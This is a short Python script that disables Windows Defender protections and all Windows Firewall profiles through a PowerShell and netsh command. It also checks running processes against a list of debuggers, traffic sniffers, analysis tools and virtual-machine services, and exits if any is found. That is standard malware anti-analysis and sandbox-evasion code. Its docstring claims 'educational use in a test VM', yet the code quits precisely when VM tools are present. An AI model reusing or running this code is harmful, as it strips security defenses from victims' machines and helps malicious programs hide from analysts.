import sys
import psutil
import subprocess

def disable_defender_and_firewall():
    """
    Disables Windows Defender and the Windows Firewall.
    Only for educational use in a test VM!
    """
    cmd = (
        "powershell Set-MpPreference -DisableRealtimeMonitoring $true "
        "-DisableArchiveScanning $true -DisableBehaviorMonitoring $true "
        "-DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true "
        "-DisableScriptScanning $true -EnableControlledFolderAccess Disabled; "
        "netsh Advfirewall set allprofiles state off"
    )
    subprocess.run(cmd, shell=True, capture_output=True)


SUSPICIOUS_PROCESSES = [
    "httpdebuggerui", "wireshark", "fiddler", "regedit", "cmd", "taskmgr", "vboxservice",
    "df5serv", "processhacker", "vboxtray", "vmtoolsd", "vmwaretray", "ida64", "ollydbg",
    "pestudio", "vmwareuser", "vgauthservice", "vmacthlp", "x96dbg", "vmsrvc", "x32dbg",
    "vmusrvc", "prl_cc", "prl_tools", "xenservice", "qemu-ga", "joeboxcontrol", "ksdumperclient",
    "ksdumper", "joeboxserver"
]

def check_for_suspicious_processes():
    """
    Checks if any suspicious processes are running.
    If found, prints a message and exits the program.
    """
    running = [p.name().lower() for p in psutil.process_iter(['name'])]
    for proc in SUSPICIOUS_PROCESSES:
        for r in running:
            if proc in r:
                print(f"Suspicious process detected: {proc}. Exiting for safety.")
                sys.exit(0)

# Usage: Call this at the very top of your main script
if __name__ == "__main__":
    check_for_suspicious_processes()